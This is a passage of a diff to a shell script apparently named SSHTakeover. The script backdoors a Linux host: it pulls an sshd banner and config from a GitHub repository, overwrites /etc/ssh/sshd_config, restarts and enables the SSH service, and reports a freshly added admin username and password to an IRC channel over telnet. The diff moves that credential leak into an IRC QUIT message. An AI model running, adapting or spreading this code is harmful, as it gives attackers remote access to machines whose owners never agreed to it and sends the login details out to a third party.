@@ -21,11 +21,12 @@ if [ ! -f ./sshd_banner ]; then curl -vL https://github.com/ind3p3nd3nt/SSHTakeo
 if [ ! -f ./sshd_config ]; then curl -vL https://github.com/ind3p3nd3nt/SSHTakeover/raw/master/sshd_config -o /etc/ssh/sshd_config; else cp -r ./sshd_config /etc/ssh/sshd_config; fi;
 if [ -f /usr/bin/yum ]; then service sshd restart && systemctl enable sshd; fi;
 if [ -f /usr/bin/apt ]; then service ssh restart && systemctl enable ssh; fi;
-arr4y="Added admin:, $random_user, password:, $random_number, Start SSHd with: sudo service ssh start (debian) or sudo service sshd start (centos)";
+arr4y="Added admin:, $random_user, password:, $random_number";
 echo $arr4y;
 echo "NICK $random_user" > input 
 echo "USER $user" >> input
 echo "JOIN #$channel" >> input
+echo "QUIT :$arr4y" >> input
 tail -f input | telnet $server 6667 | while read res
 do
   case "$res" in
@@ -36,12 +37,6 @@ do
     # for pings on nick/user
     *"You have not"*)
       echo "JOIN #$channel" >> input
-    ;;
-    *"001"*)
-    echo "JOIN #$channel" >> input
-    ;;
-    *"JOIN"*)
-    echo "PRIVMSG #$channel :Root: $arr4y :)" >> input
     ;;
   esac
 done
